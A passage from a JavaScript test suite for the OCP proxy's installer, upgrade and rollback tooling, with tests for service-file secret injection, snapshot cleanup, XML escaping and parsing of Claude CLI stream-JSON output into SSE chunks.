    writeFile: (path, content) => { if (path.endsWith("dev.ocp.proxy.plist")) plistContent = content; },
  }));
  assert.ok(plistContent, "expected the plist to be written");
  const m = plistContent.match(/<key>KeepAlive<\/key>\s*<(true|false)\/>/);
  assert.ok(m, `expected a KeepAlive key/value pair; got:\n${plistContent}`);
  assert.equal(m[1], "true", `KeepAlive must be <true/> (launchd must respawn the proxy after a crash); got <${m[1]}/>`);
});

test("G9: darwin plist writes injected secrets under their real key names (OCP_ADMIN_KEY/PROXY_ANONYMOUS_KEY/CLAUDE_BIN)", () => {
  // baseInstallOpts()'s default config leaves all three *_INJECT fields null, so every G1-G7
  // test above writes a plist with NO secrets in it — the conditional inject branches
  // (install-autostart.mjs's CLAUDE_BIN_INJECT/OCP_ADMIN_KEY_INJECT/PROXY_ANON_KEY_INJECT
  // ternaries) were dead code as far as this suite could tell. This matters because G3's own
  // justification for chmod 0600 is that these files "carry OCP_ADMIN_KEY/PROXY_ANONYMOUS_KEY"
  // — chmod without content is a lock on an empty box. Renaming the plist key (independently
  // reproduced during review) survives every G1-G8 test above; only this one catches it.
  let plistContent = null;
  installAutoStart(baseInstallOpts({
    platform: "darwin",
    servicePlan: resolveServicePlan([], "darwin"),
    config: {
      PORT: 3456, BIND_ADDRESS: "127.0.0.1", AUTH_MODE_CONFIG: "multi",
      CLAUDE_BIN_INJECT: "/custom/claude/bin",
      OCP_ADMIN_KEY_INJECT: "ocp_admin_test_token",
      PROXY_ANON_KEY_INJECT: "ocp_anon_test_token",
    },
    writeFile: (path, content) => { if (path.endsWith("dev.ocp.proxy.plist")) plistContent = content; },
  }));
  assert.ok(plistContent, "expected the plist to be written");
  assert.match(plistContent, /<key>CLAUDE_BIN<\/key>\s*<string>\/custom\/claude\/bin<\/string>/,
    `expected CLAUDE_BIN under its real key name; got:\n${plistContent}`);
  assert.match(plistContent, /<key>OCP_ADMIN_KEY<\/key>\s*<string>ocp_admin_test_token<\/string>/,
    `expected OCP_ADMIN_KEY under its real key name; got:\n${plistContent}`);
  assert.match(plistContent, /<key>PROXY_ANONYMOUS_KEY<\/key>\s*<string>ocp_anon_test_token<\/string>/,
    `expected PROXY_ANONYMOUS_KEY under its real key name; got:\n${plistContent}`);
});

test("G10: linux systemd unit writes injected secrets under their real Environment= names (OCP_ADMIN_KEY/PROXY_ANONYMOUS_KEY/CLAUDE_BIN)", () => {
  // Same gap as G9, other platform: baseInstallOpts()'s default config means the systemd
  // template's inject ternaries are equally dead code across every prior test.
  let unitContent = null;
  installAutoStart(baseInstallOpts({
    platform: "linux",
    config: {
      PORT: 3456, BIND_ADDRESS: "127.0.0.1", AUTH_MODE_CONFIG: "multi",
      CLAUDE_BIN_INJECT: "/custom/claude/bin",
      OCP_ADMIN_KEY_INJECT: "ocp_admin_test_token",
      PROXY_ANON_KEY_INJECT: "ocp_anon_test_token",
    },
    writeFile: (path, content) => { if (path.endsWith("ocp-proxy.service")) unitContent = content; },
  }));
  assert.ok(unitContent, "expected the systemd unit file to be written");
  assert.match(unitContent, /^Environment=CLAUDE_BIN=\/custom\/claude\/bin$/m,
    `expected CLAUDE_BIN under its real Environment= name; got:\n${unitContent}`);
  assert.match(unitContent, /^Environment=OCP_ADMIN_KEY=ocp_admin_test_token$/m,
    `expected OCP_ADMIN_KEY under its real Environment= name; got:\n${unitContent}`);
  assert.match(unitContent, /^Environment=PROXY_ANONYMOUS_KEY=ocp_anon_test_token$/m,
    `expected PROXY_ANONYMOUS_KEY under its real Environment= name; got:\n${unitContent}`);
});

test("upgrade full path's reconfigure phase invokes setup.mjs with --reconfigure-only", async () => {
  const result = await runUpgrade({
    yes: true,
    dryRun: false,
    mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" }
  });
  const reconfigurePhase = result.phases.find(p => p.name === "reconfigure");
  assert.ok(reconfigurePhase, "reconfigure phase must be present");
  assert.ok(reconfigurePhase.cmd.includes("setup.mjs"), `expected a setup.mjs invocation, got: ${reconfigurePhase.cmd}`);
  assert.ok(reconfigurePhase.cmd.includes("--reconfigure-only"),
    `reconfigure phase must pass --reconfigure-only so it does not enable/start — got: ${reconfigurePhase.cmd}`);
});

test("upgrade --dry-run plan text for the 'upgrade' kind names --reconfigure-only", async () => {
  const result = await runUpgrade({
    dryRun: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" }
  });
  assert.ok(result.plan.some(line => line.includes("--reconfigure-only")),
    `dry-run plan should mention --reconfigure-only; got: ${result.plan.join(" | ")}`);
});

// ── Snapshot Tests ──
import { writeSnapshot, readSnapshot, listSnapshots, gcSnapshots } from "./scripts/lib/snapshot.mjs";
import { mkdtempSync, rmSync, mkdirSync as tMkdirSync, writeFileSync as testWriteFile, existsSync as testExistsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join as testJoin } from "node:path";

console.log("\nSnapshot:");

const portableSnapshotName = (isoTimestamp) => `upgrade-snapshot-${isoTimestamp.replace(/:/g, "-")}`;
const legacyMixedSnapshot = "upgrade-snapshot-2026-05-11T09:05:00Z";
const portableMixedSnapshot = "upgrade-snapshot-2026-05-11T09-47-00Z";

function runMixedSnapshotScenario() {
  // NTFS rejects the legacy ':' name, so exercise the real exported functions
  // in an isolated process whose built-in fs bindings expose both formats.
  const moduleUrl = new URL("./scripts/lib/snapshot.mjs", import.meta.url).href;
  const script = `
    import fs from "node:fs";
    import { syncBuiltinESMExports } from "node:module";
    const names = ${JSON.stringify([legacyMixedSnapshot, portableMixedSnapshot])};
    const deleted = [];
    fs.existsSync = () => true;
    fs.readdirSync = () => [...names];
    fs.statSync = () => ({ mtimeMs: 0 });
    fs.rmSync = (path) => { deleted.push(path); };
    syncBuiltinESMExports();
    const { listSnapshots, gcSnapshots } = await import(${JSON.stringify(moduleUrl)});
    const listed = listSnapshots("/virtual-home").map(snapshot => snapshot.name);
    const gc = gcSnapshots("/virtual-home", {
      keepCount: 1,
      keepDays: 0,
      now: new Date("2026-05-12T00:00:00Z")
    });
    process.stdout.write(JSON.stringify({
      listed,
      kept: gc.kept.map(snapshot => snapshot.name),
      removed: gc.removed.map(snapshot => snapshot.name),
      deleted
    }));
  `;
  return JSON.parse(execFileSync(process.execPath, ["--input-type=module", "--eval", script], { encoding: "utf8" }));
}

test("writeSnapshot creates dir + manifest files", () => {
  const root = mkdtempSync(testJoin(tmpdir(), "ocp-snap-test-"));
  const dotOcp = testJoin(root, ".ocp");
  tMkdirSync(dotOcp, { recursive: true });
  testWriteFile(testJoin(dotOcp, "ocp.db"), "fake-sqlite-bytes");

  const path = writeSnapshot({
    homeDir: root,
    fromCommit: "abc1234",
    fromVersion: "v3.10.0",
    toVersion: "v3.14.0",
    extraFiles: []
  });
  const m = readSnapshot(path);
  assert.equal(m.fromCommit, "abc1234");
  assert.equal(m.fromVersion, "v3.10.0");
  rmSync(root, { recursive: true, force: true });
});

test("listSnapshots returns sorted by ISO timestamp", () => {
  const root = mkdtempSync(testJoin(tmpdir(), "ocp-snap-list-"));
  const dotOcp = testJoin(root, ".ocp");
  tMkdirSync(dotOcp, { recursive: true });
  for (const ts of ["2026-05-01T10:00:00Z", "2026-05-02T10:00:00Z", "2026-05-03T10:00:00Z"]) {
    tMkdirSync(testJoin(dotOcp, portableSnapshotName(ts)));
  }
  const list = listSnapshots(root);
  assert.equal(list.length, 3);
  assert.ok(list[0].path.includes("2026-05-01"));
  assert.ok(list[2].path.includes("2026-05-03"));
  rmSync(root, { recursive: true, force: true });
});

test("listSnapshots sorts mixed legacy and Windows-safe names chronologically", () => {
  const result = runMixedSnapshotScenario();
  assert.deepEqual(result.listed, [legacyMixedSnapshot, portableMixedSnapshot]);
});

test("gcSnapshots keeps the newer Windows-safe snapshot across the format boundary", () => {
  const result = runMixedSnapshotScenario();
  assert.deepEqual(result.kept, [portableMixedSnapshot]);
  assert.deepEqual(result.removed, [legacyMixedSnapshot]);
  assert.equal(result.deleted.length, 1);
  assert.ok(result.deleted[0].endsWith(legacyMixedSnapshot));
});

test("upgrade error after snapshot carries snapshotPath + hint", async () => {
  // Use mockExec=true so no real commands are run.
  // Verify the success path returns a snapshotPath (Fix B regression guard).
  const result = await runUpgrade({
    yes: true,
    dryRun: false,
    mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" }
  });
  assert.ok(result.snapshotPath, "successful upgrade returns snapshotPath");
  assert.equal(result.path, "upgrade");
  assert.equal(result.executed, true);
});

test("upgrade fresh_install requires --yes for non-interactive", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      yes: false,
      mockExec: true,
      mockDoctor: { ready_to_upgrade: false, from_version_supported: false,
                    next_action: { kind: "fresh_install", ai_executable: ["echo would-rm-rf"] },
                    current_version: "v3.2.0", latest_version: "v3.14.0" }
    });
  }, /requires --yes/);
});

test("upgrade fresh_install with --yes runs ai_executable", async () => {
  const result = await runUpgrade({
    yes: true,
    mockExec: true,
    mockDoctor: { ready_to_upgrade: false, from_version_supported: false,
                  next_action: { kind: "fresh_install",
                                 ai_executable: ["echo step-1", "echo step-2", "echo step-3"] },
                  current_version: "v3.2.0", latest_version: "v3.14.0" }
  });
  assert.equal(result.path, "fresh_install");
  assert.equal(result.steps.length, 3);
});

test("rollback --list returns snapshots", async () => {
  const result = await runUpgrade({
    rollback: true,
    list: true,
    mockSnapshots: [
      { name: "upgrade-snapshot-2026-05-01T10:00:00Z", path: "/tmp/snap-1" },
      { name: "upgrade-snapshot-2026-05-02T10:00:00Z", path: "/tmp/snap-2" }
    ]
  });
  assert.equal(result.path, "rollback-list");
  assert.equal(result.snapshots.length, 2);
});

test("rollback with no snapshots fails clearly", async () => {
  await assert.rejects(async () => {
    await runUpgrade({ rollback: true, dryRun: true, mockSnapshots: [] });
  }, /no upgrade snapshots/);
});

test("rollback --dry-run produces a plan without mutation", async () => {
  const result = await runUpgrade({
    rollback: true,
    dryRun: true,
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" }
  });
  assert.equal(result.path, "rollback-dry-run");
  assert.equal(result.executed, false);
  assert.ok(result.plan.length > 0);
});

test("rollback latest snapshot restores files (mockExec)", async () => {
  const result = await runUpgrade({
    rollback: true,
    yes: true,
    mockExec: true,
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" }
  });
  assert.equal(result.path, "rollback");
  assert.equal(result.executed, true);
  assert.ok(result.phases.some(p => p.name === "git-checkout"));
});

test("gcSnapshots keeps last N regardless of age", () => {
  const root = mkdtempSync(testJoin(tmpdir(), "ocp-gc-test-"));
  const dotOcp = testJoin(root, ".ocp");
  tMkdirSync(dotOcp, { recursive: true });
  for (const ts of ["2026-04-01T10:00:00Z", "2026-04-15T10:00:00Z", "2026-04-30T10:00:00Z", "2026-05-01T10:00:00Z", "2026-05-10T10:00:00Z"]) {
    tMkdirSync(testJoin(dotOcp, portableSnapshotName(ts)));
  }
  const result = gcSnapshots(root, { keepCount: 3, keepDays: 0, now: new Date("2026-05-11T00:00:00Z") });
  assert.equal(result.kept.length, 3);
  assert.equal(result.removed.length, 2);
  assert.ok(result.kept[0].name.includes("2026-04-30"));
  assert.ok(result.kept[2].name.includes("2026-05-10"));
  rmSync(root, { recursive: true, force: true });
});

// ── setup.mjs inject helpers: xmlEscape (real import) + assertSafeInjectValue (replica) ──
// xmlEscape used to be a verbatim replica here too, on the same "setup.mjs cannot be imported"
// premise — but #229 moved xmlEscape OUT of setup.mjs's unimportable top level and into
// scripts/lib/install-autostart.mjs, which exports it (see the import above). The premise the
// replica relied on is gone, so it's imported for real now (issue #231's stale-replica finding:
// the old comment's three justifying clauses — "setup.mjs helper", "cannot be imported",
// "keep in sync with source" — were all false once #229 landed). assertSafeInjectValue has NOT
// moved (still setup.mjs-local, still unexported, still genuinely unimportable), so its replica
// below remains legitimate.
console.log("\nsetup.mjs inject helpers:");

function assertSafeInjectValueTest(name, v) {
  if (v == null) return v;
  // eslint-disable-next-line no-control-regex
  if (/[\x00-\x1f]/.test(String(v))) {
    throw new Error(`FATAL: ${name} contains a newline or control character`);
  }
  return v;
}

test("xmlEscape encodes all five special XML chars", () => {
  assert.equal(xmlEscape('a<b>&"\''), "a&lt;b&gt;&amp;&quot;&apos;");
});

test("xmlEscape leaves normal ocp_ token untouched", () => {
  assert.equal(xmlEscape("ocp_abc123"), "ocp_abc123");
});

test("assertSafeInjectValue rejects value with newline", () => {
  assert.throws(() => assertSafeInjectValueTest("OCP_ADMIN_KEY", "a\nb"), /FATAL/);
});

test("assertSafeInjectValue rejects value with carriage return", () => {
  assert.throws(() => assertSafeInjectValueTest("OCP_ADMIN_KEY", "a\rb"), /FATAL/);
});

test("assertSafeInjectValue rejects value with a tab (control char)", () => {
  assert.throws(() => assertSafeInjectValueTest("OCP_ADMIN_KEY", "a\tb"), /FATAL/);
});

test("assertSafeInjectValue ACCEPTS a path with a space (CLAUDE_BIN may legitimately contain one)", () => {
  assert.equal(assertSafeInjectValueTest("CLAUDE_BIN", "/Users/x/My Apps/node"), "/Users/x/My Apps/node");
});

test("assertSafeInjectValue accepts normal ocp_ token", () => {
  assert.doesNotThrow(() => assertSafeInjectValueTest("OCP_ADMIN_KEY", "ocp_abc123"));
});

test("assertSafeInjectValue accepts null (omit path)", () => {
  assert.doesNotThrow(() => assertSafeInjectValueTest("OCP_ADMIN_KEY", null));
});

test("plist-merge round-trips XML-escaped value correctly via mergePlistEnv", () => {
  // A value written with xmlEscape must survive a merge cycle — the [^<]* regex in
  // parsePlistEnv only sees the escaped form (no raw < reaches it), so round-trip is safe.
  const escaped = xmlEscape("a<b>&\"'");  // "a&lt;b&gt;&amp;&quot;&apos;"
  const template = `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
  <key>EnvironmentVariables</key>
  <dict>
    <key>CLAUDE_AUTH_MODE</key>
    <string>${escaped}</string>
  </dict>
</dict>
</plist>`;
  // mergePlistEnv with no existing plist returns template unchanged.
  const merged = mergePlistEnv(null, template);
  assert.ok(merged.includes(escaped), "escaped value should survive unchanged through plist merge");
});

test("gcSnapshots keeps snapshots newer than keepDays regardless of count", () => {
  const root = mkdtempSync(testJoin(tmpdir(), "ocp-gc-days-"));
  const dotOcp = testJoin(root, ".ocp");
  tMkdirSync(dotOcp, { recursive: true });
  for (const ts of ["2026-04-01T10:00:00Z", "2026-04-15T10:00:00Z", "2026-04-30T10:00:00Z", "2026-05-01T10:00:00Z", "2026-05-10T10:00:00Z"]) {
    tMkdirSync(testJoin(dotOcp, portableSnapshotName(ts)));
  }
  // keepCount=1 but keepDays=15 means anything from after 2026-04-26 is kept too
  const result = gcSnapshots(root, { keepCount: 1, keepDays: 15, now: new Date("2026-05-11T00:00:00Z") });
  // Kept: 2026-04-30 (within 15 days), 2026-05-01 (within 15 days), 2026-05-10 (within 15 days)
  assert.ok(result.kept.length >= 3);
  // Removed: 2026-04-01, 2026-04-15
  assert.ok(result.removed.some(s => s.name.includes("2026-04-01")));
});

test("gcSnapshots never deletes the most recent snapshot", () => {
  const root = mkdtempSync(testJoin(tmpdir(), "ocp-gc-recent-"));
  const dotOcp = testJoin(root, ".ocp");
  tMkdirSync(dotOcp, { recursive: true });
  tMkdirSync(testJoin(dotOcp, portableSnapshotName("2026-01-01T10:00:00Z")));
  // Even with keepCount=0 and keepDays=0, the most recent must survive
  const result = gcSnapshots(root, { keepCount: 0, keepDays: 0, now: new Date("2026-05-11T00:00:00Z") });
  assert.equal(result.kept.length, 1);
  assert.equal(result.removed.length, 0);
  rmSync(root, { recursive: true, force: true });
});

test("gcSnapshots --dry-run reports plan without deleting", () => {
  const root = mkdtempSync(testJoin(tmpdir(), "ocp-gc-dryrun-"));
  const dotOcp = testJoin(root, ".ocp");
  tMkdirSync(dotOcp, { recursive: true });
  for (const ts of ["2026-04-01T10:00:00Z", "2026-04-15T10:00:00Z", "2026-05-10T10:00:00Z"]) {
    tMkdirSync(testJoin(dotOcp, portableSnapshotName(ts)));
  }
  const result = gcSnapshots(root, { keepCount: 1, keepDays: 0, dryRun: true, now: new Date("2026-05-11T00:00:00Z") });
  assert.equal(result.dryRun, true);
  assert.equal(result.removed.length, 2);
  // Files still exist
  assert.ok(testExistsSync(testJoin(dotOcp, portableSnapshotName("2026-04-01T10:00:00Z"))));
  rmSync(root, { recursive: true, force: true });
});

// ── Doctor --check oauth fast path tests ──
console.log("\nDoctor --check oauth:");

await asyncTest("doctor --check oauth runs only oauth check (skips version/from-version)", async () => {
  const result = await runDoctor({
    checkOnly: "oauth",
    mockVersion: "v3.10.0",
    mockLatest: "v3.14.0",
    mockHealth: { status: 200, body: { auth: { ok: true, message: "authenticated" } } }
  });
  // Should still produce a valid result object
  assert.equal(result.schema_version, "1");
  // checks[] should only contain oauth_ok (no current_version, no from_version_supported)
  const ids = result.checks.map(c => c.id);
  assert.deepEqual(ids, ["oauth_ok"]);
  assert.equal(result.next_action.kind, "noop");
});

await asyncTest("doctor --check oauth + OAuth FAIL → fix_oauth", async () => {
  const result = await runDoctor({
    checkOnly: "oauth",
    mockHealth: { status: 200, body: { auth: { ok: false, message: "ENOEXEC" } } }
  });
  const ids = result.checks.map(c => c.id);
  assert.deepEqual(ids, ["oauth_ok"]);
  assert.equal(result.next_action.kind, "fix_oauth");
  assert.equal(result.fail_count, 1);
});

await asyncTest("doctor --check oauth + service down → fix_service", async () => {
  const result = await runDoctor({
    checkOnly: "oauth",
    mockHealth: { error: "ECONNREFUSED" }
  });
  const ids = result.checks.map(c => c.id);
  assert.deepEqual(ids, ["oauth_ok"]);
  assert.equal(result.next_action.kind, "fix_service");
  assert.equal(result.fail_count, 1);
});

await asyncTest("doctor --check oauth + 200 with null body → fix_service", async () => {
  const result = await runDoctor({
    checkOnly: "oauth",
    mockHealth: { status: 200, body: null }
  });
  const ids = result.checks.map(c => c.id);
  assert.deepEqual(ids, ["oauth_ok"]);
  assert.equal(result.next_action.kind, "fix_service");
  assert.equal(result.fail_count, 1);
});

// ── Stream-JSON parser tests ──────────────────────────────────────────────
// MIRRORS server.mjs parseStreamJsonLines/parseStreamJsonEvent — keep in sync.
// Copied verbatim to avoid importing server.mjs (top-level server.listen() would
// start a live HTTP server). The logEvent stub silences observability side-effects.
console.log("\nStream-JSON parsers:");

function logEvent() {} // stub — observability side-effect not needed in tests

function parseStreamJsonLines(buffered) {
  const lines = buffered.split("\n");
  const remainder = lines.pop(); // last element is the incomplete trailing line
  const events = [];
  for (const line of lines) {
    const trimmed = line.trim();
    if (trimmed === "") continue;
    try {
      events.push(JSON.parse(trimmed));
    } catch {
      console.error("[claude] NDJSON parse error on line:", trimmed.slice(0, 120));
      events.push({ type: "parse_error", raw: trimmed });
    }
  }
  return { events, remainder: remainder ?? "" };
}

function parseStreamJsonEvent(event, sawTextDelta) {
  const t = event?.type;

  // system/* — first-event init + other system meta (api_retry etc.)
  if (t === "system") return null;
  // user — echo of user message; consumed
  if (t === "user") return null;

  // stream_event — contains nested content_block_delta
  if (t === "stream_event") {
    const inner = event.event ?? event;
    if (inner?.type === "content_block_delta" && inner.delta?.type === "text_delta") {
      return { text: inner.delta.text ?? "", fromDelta: true };
    }
    // Other stream_event sub-types (content_block_start, message_delta, etc.) — consumed
    return null;
  }

  // assistant — aggregate message. Without --include-partial-messages each assistant message
  // arrives as its own aggregate event; an agentic turn emits several (preamble + tool rounds +
  // final answer), so accumulate EVERY one. Only guard the delta+aggregate double-count case:
  // if streaming deltas were already seen (sawTextDelta), the aggregate duplicates them.
  // Reference: OLP commit 65f945c (assistant-aggregate fallback, fold-in).
  if (t === "assistant") {
    if (!sawTextDelta) {
      const blocks = event.message?.content;
      if (Array.isArray(blocks)) {
        const text = blocks
          .filter(b => b && b.type === "text" && typeof b.text === "string")
          .map(b => b.text)
          .join("");
        if (text) return { text };
      }
    }
    return null;
  }

  // result — terminal event
  if (t === "result") {
    if (event.is_error === true) {
      return { error: event.error_message ?? event.result ?? "claude returned is_error" };
    }
    return { stop: true };
  }

  // rate_limit_event / usage — log for observability, don't forward
  if (t === "rate_limit_event" || t === "usage") {
    logEvent("info", "claude_stream_event", { type: t, data: JSON.stringify(event).slice(0, 200) });
    return null;
  }

  // control_request — per Anthropic stream-json docs
  if (t === "control_request") {
    console.error("[claude] stream_json control_request event (ignored):", JSON.stringify(event).slice(0, 120));
    return null;
  }

  // parse_error — already logged by parseStreamJsonLines
  if (t === "parse_error") return null;

  // Unknown event type — log + skip; future-proof for new claude CLI events
  if (t !== undefined) {
    console.error("[claude] unknown stream_json event type:", t);
  }
  return null;
}

// (a) content_block_delta deltas + assistant-aggregate fallback → assembled text with NO double-count
test("parseStreamJsonEvent: stream_event content_block_delta yields text", () => {
  const event = {
    type: "stream_event",
    event: { type: "content_block_delta", delta: { type: "text_delta", text: "Hello" } }
  };
  const result = parseStreamJsonEvent(event, false);
  assert.deepEqual(result, { text: "Hello", fromDelta: true });
});

test("parseStreamJsonEvent: assistant-aggregate used when no delta seen (sawTextDelta=false)", () => {
  const event = {
    type: "assistant",
    message: { content: [{ type: "text", text: "Short answer." }] }
  };
  const result = parseStreamJsonEvent(event, false);
  assert.deepEqual(result, { text: "Short answer." });
});

test("parseStreamJsonEvent: assistant-aggregate skipped when a delta was seen (sawTextDelta=true, no double-count)", () => {
  const event = {
    type: "assistant",
    message: { content: [{ type: "text", text: "Short answer." }] }
  };
  const result = parseStreamJsonEvent(event, true);
  assert.equal(result, null);
});

test("parseStreamJsonEvent: stream_event + assistant → assembled without double-count", () => {
  // Simulate receiving a content_block_delta first, then an assistant aggregate
  const delta = {
    type: "stream_event",
    event: { type: "content_block_delta", delta: { type: "text_delta", text: "Streaming text." } }
  };
  const agg = {
    type: "assistant",
    message: { content: [{ type: "text", text: "Streaming text." }] }
  };
  // First event: no delta seen yet → yields text and marks fromDelta
  const r1 = parseStreamJsonEvent(delta, false);
  assert.deepEqual(r1, { text: "Streaming text.", fromDelta: true });
  // Second event (aggregate): a delta was seen (sawTextDelta=true) → duplicate, null
  const r2 = parseStreamJsonEvent(agg, true);
  assert.equal(r2, null);
});

// REGRESSION (agentic turns): without --include-partial-messages a tool-using turn emits SEVERAL
// aggregate `assistant` events (preamble, then the final answer after tool use) and NO deltas.
// Every one must be captured — the old first-only guard dropped the final answer.
test("parseStreamJsonEvent: multi-message agentic turn captures preamble AND final answer", () => {
  const preamble = {
    type: "assistant",
    message: { content: [
      { type: "text", text: "I'll find the homepage repo and remove the calendar." },
      { type: "tool_use", id: "t1", name: "Bash" },
    ] }
  };
  const toolResult = { type: "user", message: { content: [{ type: "tool_result", content: "ok" }] } };
  const finalMsg = {
    type: "assistant",
    message: { content: [{ type: "text", text: "Done — removed the calendar widget and pushed." }] }
  };
  // No deltas are ever emitted in aggregate mode, so sawTextDelta stays false throughout.
  const r1 = parseStreamJsonEvent(preamble, false);
  assert.deepEqual(r1, { text: "I'll find the homepage repo and remove the calendar." });
  const r2 = parseStreamJsonEvent(toolResult, false); // user/tool_result echo — consumed
  assert.equal(r2, null);
  const r3 = parseStreamJsonEvent(finalMsg, false);   // <- old code returned null here (bug)
  assert.deepEqual(r3, { text: "Done — removed the calendar widget and pushed." });
});

// (b) aggregate-only short response → assembles correctly
test("parseStreamJsonEvent: aggregate-only multi-block response assembles all text blocks", () => {
  const event = {
    type: "assistant",
    message: {
      content: [
        { type: "text", text: "Part one." },
        { type: "tool_use", id: "x" }, // non-text block — should be filtered
        { type: "text", text: " Part two." }
      ]
    }
  };
  const result = parseStreamJsonEvent(event, false);
  assert.deepEqual(result, { text: "Part one. Part two." });
});

// (c) JSON line split across two parseStreamJsonLines calls → partial-line buffering
test("parseStreamJsonLines: partial line carried as remainder", () => {
  const chunk1 = '{"type":"system","subtype":"init"}\n{"type":"stream_ev';
  const { events: ev1, remainder: rem1 } = parseStreamJsonLines(chunk1);
  assert.equal(ev1.length, 1);
  assert.equal(ev1[0].type, "system");
  assert.equal(rem1, '{"type":"stream_ev');

  const chunk2 = rem1 + 'ent","event":{"type":"content_block_delta","delta":{"type":"text_delta","text":"Hi"}}}\n';
  const { events: ev2, remainder: rem2 } = parseStreamJsonLines(chunk2);
  assert.equal(ev2.length, 1);
  assert.equal(ev2[0].type, "stream_event");
  assert.equal(rem2, "");
  // Verify the reassembled event parses through parseStreamJsonEvent correctly
  const parsed = parseStreamJsonEvent(ev2[0], false);
  assert.deepEqual(parsed, { text: "Hi", fromDelta: true });
});

test("parseStreamJsonLines: empty input returns no events and empty remainder", () => {
  const { events, remainder } = parseStreamJsonLines("");
  assert.equal(events.length, 0);
  assert.equal(remainder, "");
});

// (d) is_error result event → surfaces the error
test("parseStreamJsonEvent: result is_error=true surfaces error_message", () => {
  const event = { type: "result", is_error: true, error_message: "Rate limit hit" };
  const result = parseStreamJsonEvent(event, false);
  assert.deepEqual(result, { error: "Rate limit hit" });
});

test("parseStreamJsonEvent: result is_error=true falls back to result field when no error_message", () => {
  const event = { type: "result", is_error: true, result: "error detail" };
  const result = parseStreamJsonEvent(event, false);
  assert.deepEqual(result, { error: "error detail" });
});

test("parseStreamJsonEvent: result is_error=true falls back to default string when no detail", () => {
  const event = { type: "result", is_error: true };
  const result = parseStreamJsonEvent(event, false);
  assert.deepEqual(result, { error: "claude returned is_error" });
});

test("parseStreamJsonEvent: result is_error=false yields stop", () => {
  const event = { type: "result", is_error: false, result: "success" };
  const result = parseStreamJsonEvent(event, false);
  assert.deepEqual(result, { stop: true });
});

// (e) malformed/non-JSON line → skipped without throwing
test("parseStreamJsonLines: malformed JSON line becomes parse_error event without throwing", () => {
  const input = '{"type":"system"}\nnot-valid-json\n{"type":"result","is_error":false}\n';
  const { events, remainder } = parseStreamJsonLines(input);
  assert.equal(events.length, 3);
  assert.equal(events[0].type, "system");
  assert.equal(events[1].type, "parse_error");
  assert.equal(events[1].raw, "not-valid-json");
  assert.equal(events[2].type, "result");
});

test("parseStreamJsonEvent: parse_error event returns null without throwing", () => {
  const event = { type: "parse_error", raw: "garbage" };
  const result = parseStreamJsonEvent(event, false);
  assert.equal(result, null);
});

// Additional edge cases
test("parseStreamJsonEvent: system event returns null", () => {
  const result = parseStreamJsonEvent({ type: "system", subtype: "init" }, true);
  assert.equal(result, null);
});

test("parseStreamJsonEvent: user event returns null", () => {
  const result = parseStreamJsonEvent({ type: "user", message: {} }, true);
  assert.equal(result, null);
});

test("parseStreamJsonEvent: stream_event non-text-delta (content_block_start) returns null", () => {
  const event = { type: "stream_event", event: { type: "content_block_start", index: 0 } };
  const result = parseStreamJsonEvent(event, true);
  assert.equal(result, null);
});

test("parseStreamJsonEvent: unknown event type returns null", () => {
  const result = parseStreamJsonEvent({ type: "future_event_type" }, false);
  assert.equal(result, null);
});
// ── Suite: streamStringAsSSE wire-format ────────────────────────────────
// streamStringAsSSE is not exported from server.mjs (internal helper), so we
// test the wire format contract using a local implementation with the same
// logic.  This validates the protocol shape (role chunk → content chunks →
// stop → [DONE]) that both the cache-hit replay and TUI streaming paths rely on.
console.log("\nstreamStringAsSSE wire-format:");

function _testSendSSE(res, data) { res.write(`data: ${JSON.stringify(data)}\n\n`); }

function _testStreamStringAsSSE(res, id, model, content) {
  const created = Math.floor(Date.now() / 1000);
  res.writeHead(200, { "Content-Type": "text/event-stream" });
  _testSendSSE(res, { id, object: "chat.completion.chunk", created, model, choices: [{ index: 0, delta: { role: "assistant" }, finish_reason: null }] });
  const CHUNK = 80;
  const codepoints = Array.from(content);
  for (let i = 0; i < codepoints.length; i += CHUNK) {
    _testSendSSE(res, { id, object: "chat.completion.chunk", created, model, choices: [{ index: 0, delta: { content: codepoints.slice(i, i + CHUNK).join("") }, finish_reason: null }] });
  }
  _testSendSSE(res, { id, object: "chat.completion.chunk", created, model, choices: [{ index: 0, delta: {}, finish_reason: "stop" }] });
  res.write("data: [DONE]\n\n");
  res.end();
}

function _makeFakeRes() {
  const writes = [];
  let headsSent = false;
  return {
    writes,
    writeHead(status, headers) { headsSent = true; this._status = status; this._headers = headers; },
    write(s) { writes.push(s); },
    end() { this._ended = true; },
  };
}

test("streamStringAsSSE emits role chunk + content chunks + stop + [DONE]", () => {
  const res = _makeFakeRes();
  const content = "hello world";
  _testStreamStringAsSSE(res, "test-id", "claude-haiku", content);
  assert.ok(res._status === 200, "writeHead(200) called");
  assert.ok(res._ended, "res.end() called");
  // First write: role delta
  const firstEvent = JSON.parse(res.writes[0].replace(/^data: /, "").trim());
  assert.equal(firstEvent.choices[0].delta.role, "assistant");
  assert.equal(firstEvent.choices[0].finish_reason, null);
  // Since content < 80 chars it fits in one chunk
  const secondEvent = JSON.parse(res.writes[1].replace(/^data: /, "").trim());
  assert.equal(secondEvent.choices[0].delta.content, content);
  // Second-to-last: stop chunk
  const stopEvent = JSON.parse(res.writes[res.writes.length - 2].replace(/^data: /, "").trim());
  assert.equal(stopEvent.choices[0].finish_reason, "stop");
  // Last: [DONE]
  assert.equal(res.writes[res.writes.length - 1], "data: [DONE]\n\n");
});

test("streamStringAsSSE splits content at 80 codepoints per chunk", () => {
  const res = _makeFakeRes();
  const content = "x".repeat(200); // 3 chunks: 80+80+40
  _testStreamStringAsSSE(res, "test-id-2", "claude-haiku", content);
